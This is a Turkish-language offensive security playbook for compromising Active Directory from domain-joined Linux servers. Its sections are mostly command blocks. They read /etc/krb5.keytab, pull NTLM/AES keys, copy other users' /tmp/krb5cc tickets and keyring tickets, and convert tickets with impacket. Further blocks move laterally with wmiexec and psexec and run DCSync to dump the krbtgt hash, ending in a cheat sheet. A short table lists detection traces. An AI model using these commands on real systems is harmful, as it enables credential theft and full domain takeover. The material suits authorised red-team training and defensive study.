## 1. Genel Bakış ve Mimari

Modern kurumsal ortamlarda veritabanları (Oracle, PostgreSQL, MySQL), web sunucuları (Apache, Nginx, Tomcat) ve konteyner orkestrasyon altyapıları ağırlıklı olarak Linux tabanlıdır. Bu sunucular, merkezi kimlik yönetimi sağlamak amacıyla **SSSD (System Security Services Daemon)**, **realmd** veya **Winbind/Samba** aracılığıyla Active Directory etki alanına dahil edilir.

Linux istemcilerin etki alanıyla Kerberos protokolü üzerinden haberleşmesi, saldırganlar için Windows LSASS süreçlerine alternatif ve son derece zengin bir **bilet ve anahtar hazinesi** oluşturur:

```
┌──────────────────────────────────────────────────────────────────────────────────┐
│                           LINUX DOMAIN-JOINED HOST                               │
│                                                                                  │
│   [ Sistem Anahtarları ]          [ Kullanıcı Biletleri ]     [ Çekirdek Belleği ]
│   /etc/krb5.keytab                /tmp/krb5cc_<uid>           Linux Kernel Keyring
│   (Makine & Servis NTLM/AES)      (Aktif Oturum CCACHE)       (keyctl / Session)  
│            │                               │                           │         
│            ▼                               ▼                           ▼         
│   klist -k -t /etc/krb5.keytab    export KRB5CCNAME=...       keyctl pipe <id>   
│   kinit -k -t ... LINUX01$        ticketConverter.py          SSSD KCM Cache     
└────────────┬───────────────────────────────┬───────────────────────────┬─────────┘
             │                               │                           │
             ▼                               ▼                           ▼
┌──────────────────────────────────────────────────────────────────────────────────┐
│                          ACTIVE DIRECTORY ETKİ ALANI                             │
│                                                                                  │
│   Domain Controller (KDC)                 Hedef Windows Sunucular (SMB/RPC)      │
│   - TGT / TGS Bilet Talepleri             - secretsdump.py -k -no-pass           │
│   - DCSync Yetkisi ile NTDS Dökümü        - wmiexec.py / psexec.py -k            │
└──────────────────────────────────────────────────────────────────────────────────┘
```

### Kritik Bilet Depolama Tipleri:
1. **Keytab Dosyaları (`/etc/krb5.keytab`):** Linux sunucunun Active Directory bilgisayar hesabı (`HOSTNAME$@DOMAIN.COM`) veya barındırdığı servisler (HTTP, NFS, CIFS) için gerekli olan Kerberos anahtarlarını (DES, RC4/NTLM, AES-128, AES-256) saklayan ikili dosyalardır. Parola girmeden doğrudan etki alanından bilet almayı sağlar.
2. **Dosya Tabanlı Bilet Önbelleği (`FILE:/tmp/krb5cc_<UID>`):** Kullanıcı oturum açtığında üretilen Kerberos TGT/TGS biletleri varsayılan olarak `/tmp` dizininde dosya formatında saklanır. `root` yetkisine sahip bir saldırgan tüm aktif domain kullanıcılarının (Domain Adminler dahil) biletlerini kopyalayabilir.
3. **Kernel Keyring (`KEYRING:persistent:<UID>`):** Biletlerin disk yerine Linux çekirdeğinin hafızasında saklanmasını sağlar. `keyutils` paketiyle doğrudan okunabilir.
4. **SSSD KCM (Kerberos Cache Manager):** Biletlerin `/var/lib/sss/secrets/secrets.ldb` içinde tutulduğu soket tabanlı modern önbellekleme mekanizmasıdır.

## 2. Keytab Hasadı ve Oturum Açma (Keytab Harvesting)

Linux sunucuda root veya yetkili bir hesap ele geçirildiğinde ilk hedef `/etc/krb5.keytab` dosyasıdır.

### 2.1. Keytab İçeriğini İnceleme

Hedef keytab dosyasında hangi SPN ve şifreleme anahtarlarının bulunduğunu listeleme:

```bash
# 1. klist ile keytab içerisindeki SPN ve KVNO değerlerini listeleme
klist -k -t /etc/krb5.keytab

# 2. ktutil interaktif konsolu ile anahtar detaylarını inceleme
ktutil
ktutil:  read_kt /etc/krb5.keytab
ktutil:  list -e
ktutil:  quit
```

### 2.2. Keytab ile TGT Üretme ve Etki Alanına Sızma

Keytab içindeki makine hesabı veya servis hesabı ile doğrudan KDC'den bilet talep edilir:

```bash
# 1. Bilgisayar hesabı adıyla KDC'den TGT talep etme
kinit -k -t /etc/krb5.keytab LINUX01$@CORP.LOCAL

# 2. Alınan bileti doğrulama
klist

# 3. Elde edilen makine bileti ile etki alanı denetleyicisinden kullanıcı dökümü alma
impacket-GetADUsers -k -no-pass -dc-ip 10.0.0.10 CORP.LOCAL/
```

### 2.3. Keytab'dan NTLM ve AES Karmalarını Çıkarma (KeyTabExtract)

Keytab dosyasındaki ikili verileri çevirerek NTLM hash'ini ve AES anahtarlarını elde etme:

```bash
# 1. keytabextract aracı ile anahtarları çözme
python3 /opt/tools/keytabextract.py /etc/krb5.keytab

# 2. Elde edilen NTLM hash ile Pass-the-Hash yanal hareketi gerçekleştirme
nxc smb 10.0.0.0/24 -u 'LINUX01$' -H '58a478e2c61073863cb73330f382207b'
```

## 3. CCACHE ve Bellek Biletlerinin Çalınması (Ticket Extraction)

Linux sunucuya SSH veya konsol ile bağlanan etki alanı kullanıcılarının oturum biletleri anlık olarak bellekte veya geçici dosyalarda tutulur.

### 3.1. `/tmp` Dizinindeki CCACHE Biletlerini Toplama

```bash
# 1. /tmp altındaki tüm Kerberos biletlerini tespit etme
ls -la /tmp/krb5cc_*

# 2. Hedef kullanıcının biletini kendi çalışma oturumumuza kopyalama
cp /tmp/krb5cc_10002 /tmp/compromised_ccache
chmod 600 /tmp/compromised_ccache

# 3. KRB5CCNAME ortam değişkenini hedef bilete yönlendirme
export KRB5CCNAME=/tmp/compromised_ccache

# 4. Biletin kime ait olduğunu ve geçerlilik süresini inceleme
klist
```

### 3.2. Linux Kernel Keyring Üzerinden Bilet Çıkarma

Eğer krb5 konfigürasyonunda `default_ccache_name = KEYRING:persistent:%{uid}` tanımlıysa biletler diske yazılmaz:

```bash
# 1. Mevcut keyring yapısını ve anahtar ID'lerini görüntüleme
keyctl show

# 2. Bilet içeren anahtarı tespit edip ham bilet dosyasını diske dökme
keyctl list @u
keyctl pipe 83726194 > /tmp/dumped_keyring.ccache

# 3. Dökülen bileti oturuma dahil etme
export KRB5CCNAME=/tmp/dumped_keyring.ccache
klist
```

### 3.3. Bilet Formatı Dönüştürme: CCACHE ↔ KIRBI (`ticketConverter.py`)

Linux ortamında toplanan `.ccache` biletleri, Windows Rubeus veya Mimikatz ile doğrudan kullanılamaz. Aynı şekilde Rubeus çıktısı `.kirbi` biletleri Linux'ta doğrudan tanınmaz:

```bash
# 1. Linux CCACHE biletini Windows .kirbi formatına çevirme
impacket-ticketConverter /tmp/compromised_ccache /tmp/admin_ticket.kirbi

# 2. Windows .kirbi biletini Linux CCACHE formatına çevirme
impacket-ticketConverter /tmp/rubeus_harvest.kirbi /tmp/linux_usable.ccache
export KRB5CCNAME=/tmp/linux_usable.ccache
```

## 4. Linux Üzerinden Yanal Hareket ve Yetki Yükseltme

Elde edilen TGT/TGS biletleri ile Windows ortamına yanal hareket ve yetki yükseltme saldırıları icra edilir.

### 4.1. Elde Edilen Bilet ile Impacket Üzerinden Pass-the-Ticket Yanal Hareketi

```bash
# 1. Biletin geçerli olduğu etki alanında uzak komut çalıştırma (WMI / SMB)
export KRB5CCNAME=/tmp/compromised_ccache
impacket-wmiexec -k -no-pass CORP.LOCAL/da_user@dc01.corp.local

# 2. PsExec ile SYSTEM oturumu alma
impacket-psexec -k -no-pass CORP.LOCAL/da_user@srv-files01.corp.local
```

### 4.2. Linux Bilgisayar Hesabı ile DCSync İstismarı

Eğer Linux makine hesabı (`LINUX01$`) yanlışlıkla etki alanı üzerinde replikasyon yetkilerine (`DS-Replication-Get-Changes-All`) sahipse:

```bash
# 1. Keytab ile makine oturumu açma
kinit -k -t /etc/krb5.keytab LINUX01$@CORP.LOCAL

# 2. Bilet üzerinden doğrudan DCSync gerçekleştirerek krbtgt hash'ini çekme
export KRB5CCNAME=/tmp/krb5cc_0
impacket-secretsdump -k -no-pass -just-dc-user krbtgt dc01.corp.local
```

## 5. OPSEC ve İz Bırakma Analizi (IOC)

| Eylem | Linux Tarafında Bırakılan İz | Windows / AD Tarafında Bırakılan İz | EDR / SIEM Tespiti |
|---|---|---|---|
| `/etc/krb5.keytab` Okunması | `auditd` Event: `keytab_access` (syscall: open/read) | Yok (Çevrimdışı işlem) | Linux EDR: Hassas kimlik dosyası erişim alarmı |
| `kinit -k -t` ile Bilet Alımı | Linux bash geçmişi, `/tmp/krb5cc_*` oluşumu | **Event ID 4768** (Kerberos TGT Request: Target `LINUX01$`) | Standart makine oturum açma telemetrisi |
| `/tmp` Biletlerinin Çalınması | `auditd` Event: `/tmp/krb5cc_*` dosya okuma | Yok (Çevrimdışı işlem) | Root olmayan sürecin yabancı UID biletini okuması |
| Çalınan Biletle Yanal Hareket | Ağ bağlantısı (TCP 445 / 135 / 88) | **Event ID 4624** (Logon Type 3, Kerberos) | IP adresi ile biletteki iş istasyonu uyuşmazlığı |

## 6. En Çok Kullanılan Komutlar (Cheat Sheet)

```bash
# 1. Keytab içeriğini listeleme
klist -k -t /etc/krb5.keytab

# 2. Keytab üzerinden TGT alıp doğrula
kinit -k -t /etc/krb5.keytab LINUX01$@CORP.LOCAL && klist

# 3. Keytab dosyasından NTLM hash ayıklama
python3 keytabextract.py /etc/krb5.keytab

# 4. /tmp altındaki tüm biletleri arama
find /tmp -name "krb5cc_*" 2>/dev/null

# 5. Çalınan CCACHE biletini oturuma tanıtma
export KRB5CCNAME=/tmp/krb5cc_10001

# 6. CCACHE biletini Windows uyumlu Kirbi formatına dönüştürme
impacket-ticketConverter /tmp/krb5cc_10001 /tmp/ticket.kirbi

# 7. Aktif bilet ile parolasız WMI komut yürütme
impacket-wmiexec -k -no-pass CORP.LOCAL/admin_user@10.0.0.10

# 8. Linux makine bileti ile DCSync yürütme
impacket-secretsdump -k -no-pass -just-dc-ntlm dc01.corp.local
```
